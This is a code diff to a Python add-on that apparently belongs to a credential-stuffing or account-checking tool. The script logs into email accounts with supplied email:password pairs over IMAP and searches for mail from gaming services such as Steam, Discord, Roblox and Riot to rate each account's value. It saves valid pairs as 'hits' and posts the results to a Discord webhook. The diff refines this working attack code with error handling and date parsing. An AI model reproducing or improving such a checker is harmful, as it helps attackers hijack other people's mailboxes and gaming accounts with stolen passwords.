@@ -1,5 +1,6 @@
-import imaplib, requests, json, os
+import imaplib, requests, json, os, re
 from email.utils import parsedate_to_datetime
+from datetime import datetime
 
 with open('addons/Inbox/config.json', 'r') as config_file:
     config = json.load(config_file)
@@ -18,6 +19,14 @@ check_rockstar = config["default_checks"]["rockstargames"]
 
 discord_webhook = config["discord_webhook"]
 
+def parsedate(date_str):
+    date_regex = re.compile(r'Date: (\w{3}), (\d{2}) (\w{3}) (\d{4}) (\d{2}):(\d{2}):(\d{2}) \+0000 \(UTC\)')
+    match = date_regex.match(date_str)
+    if match:
+        day_name, day, month, year, hour, minute, second = match.groups()
+        month = datetime.strptime(month, '%b').month
+        return datetime(int(year), month, int(day), int(hour), int(minute), int(second))
+
 def inboxmail(email, password):
     # Setup IMAP
     email_parts = email.split('@')
@@ -32,8 +41,8 @@ def inboxmail(email, password):
     for imap_server in imap_servers:
         try:
             imap = imaplib.IMAP4_SSL(imap_server, timeout=30)
-
         except Exception as e:
+            print(f"Failed to connect to IMAP server {imap_server}: {e}")
             continue
         try:
             imap.login(email, password)
@@ -43,17 +52,16 @@ def inboxmail(email, password):
                 counts = {}
                 discord_year = None
                 reddit_year = None
-
-                if check_roblox == True:
+                if check_roblox:
                     result, accounts_data = imap.uid("search", None, f'(FROM "accounts@roblox.com")')
                     result, noreply_data = imap.uid("search", None, f'(FROM "no-reply@roblox.com")')
                     if result == "OK":
                         counts['Roblox'] = len(accounts_data[0].split()) + len(noreply_data[0].split())
-                if check_steam == True:
+                if check_steam:
                     result, data = imap.uid("search", None, f'(FROM "noreply@steampowered.com")')
                     if result == "OK":
                         counts['Steam'] = len(data[0].split())
-                if check_discord == True:
+                if check_discord:
                     result, data = imap.uid("search", None, f'(FROM "noreply@discord.com")')
                     if result == "OK":
                         discord_uids = data[0].split()
@@ -62,9 +70,9 @@ def inboxmail(email, password):
                             result, data = imap.uid("fetch", discord_uids[0], "(BODY[HEADER.FIELDS (DATE)])")
                             if result == "OK":
                                 date_str = data[0][1].decode().strip()
-                                email_date = parsedate_to_datetime(date_str)
+                                email_date = parsedate(date_str)
                                 discord_year = email_date.year
-                if check_reddit == True:
+                if check_reddit:
                     result, main_data = imap.uid("search", None, f'(FROM "noreply@reddit.com")')
                     result, mail_data = imap.uid("search", None, f'(FROM "noreply@redditmail.com")')
                     if result == "OK":
@@ -75,24 +83,24 @@ def inboxmail(email, password):
                             result, data = imap.uid("fetch", mail_uids[0], "(BODY[HEADER.FIELDS (DATE)])")
                             if result == "OK":
                                 date_str = data[0][1].decode().strip()
-                                email_date = parsedate_to_datetime(date_str)
+                                email_date = parsedate(date_str)
                                 reddit_year = email_date.year
                         
                         elif main_uids:
                             result, data = imap.uid("fetch", main_uids[0], "(BODY[HEADER.FIELDS (DATE)])")
                             if result == "OK":
                                 date_str = data[0][1].decode().strip()
-                                email_date = parsedate_to_datetime(date_str)
+                                email_date = parsedate(date_str)
                                 reddit_year = email_date.year
-                if check_epicgames == True:
+                if check_epicgames:
                     result, data = imap.uid("search", None, f'(FROM "help@accts.epicgames.com")')
                     if result == "OK":
                         counts['Epic Games'] = len(data[0].split())
-                if check_riot == True:
+                if check_riot:
                     result, data = imap.uid("search", None, f'(FROM "noreply@mail.accounts.riotgames.com")')
                     if result == "OK":
                         counts['Riot'] = len(data[0].split())
-                if check_rockstar == True:
+                if check_rockstar:
                     result, data = imap.uid("search", None, f'(FROM "noreply@rockstargames.com")')
                     if result == "OK":
                         counts['Rockstar'] = len(data[0].split())
@@ -114,6 +122,7 @@ def inboxmail(email, password):
                             file.write(f'{email}:{password} | {count} hits\n')
 
         except Exception as e:
+            print(f"Failed to login or fetch emails: {e}")
             continue
         # Discord Webhook
         if any(count > 0 for count in counts.values()):
@@ -129,13 +138,13 @@ def inboxmail(email, password):
             
             for service, count in counts.items():
                 if count > 0:
-                    if service == 'Reddit' and count > 1 and reddit_year:
+                    if service == 'Reddit' and reddit_year:
                         embed["fields"].append({
                             "name": service,
                             "value": f"``{count} Hits (Estimated Year: {reddit_year})``",
                             "inline": True
                         })
-                    elif service == 'Discord' and count > 1 and discord_year:
+                    elif service == 'Discord' and discord_year:
                         embed["fields"].append({
                             "name": service,
                             "value": f"``{count} Hits (Estimated Year: {discord_year})``",
@@ -148,7 +157,9 @@ def inboxmail(email, password):
                             "inline": True
                         })
 
-            payload = {"embeds": [embed]}
-            r = requests.post(discord_webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
-            if r.status_code == 404:
-                input("Hold up! You forgot to provide a webhook for Inbox. Hits are not being logged! Edit addons/Inbox/config.json")
+            try:
+                response = requests.post(discord_webhook, json={"embeds": [embed]})
+                if response.status_code != 204:
+                    print(f"Failed to send webhook, status code: {response.status_code}, response: {response.text}")
+            except Exception as e:
+                print(f"Failed to send webhook: {e}")
